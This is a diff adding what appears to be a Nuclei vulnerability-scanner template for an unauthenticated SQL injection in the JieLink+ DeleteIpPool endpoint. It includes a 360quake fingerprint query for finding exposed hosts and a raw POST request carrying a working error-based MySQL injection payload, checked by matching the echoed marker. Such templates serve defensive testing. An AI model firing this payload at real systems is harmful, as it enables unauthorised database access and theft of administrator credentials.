@@ -1,0 +1,31 @@
+id: JieLink-DeleteIpPool-sql
+
+info:
+  name: "JieLink+ DeleteIpPool 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    360quake: title="JieLink" AND (favicon: "2f809c4759399cae458a29f24490a114")
+      JieLink+ 智能终端操作平台 DeleteIpPool 接口在输入验证机制实现上存在不足，攻击者可通过构造恶意SQL语句执行任意数据库操作。该缺陷允许未经身份验证的远程攻击者获取数据库敏感信息（包括但不限于管理员凭证、用户隐私数据），在具备高权限访问条件时，可进一步通过数据库写入操作植入恶意代码，实现对服务器的控制。
+  reference:
+  - https://mp.weixin.qq.com/s/Tc4wH0cP1P-Wr-WbzPTc5w
+  tags: JieLink+
+
+http:
+- raw:
+  - |
+    POST /project/IPPool/DeleteIpPool HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    ids=-99 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171627171,(SELECT (ELT(7502=7502,1))),0x7171706a71,0x78))s), 8446744073709551610, 8446744073709551610)))&syncFlag=1
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qqbqq1qqpjqx'
+  - type: status
+    status:
+    - 200
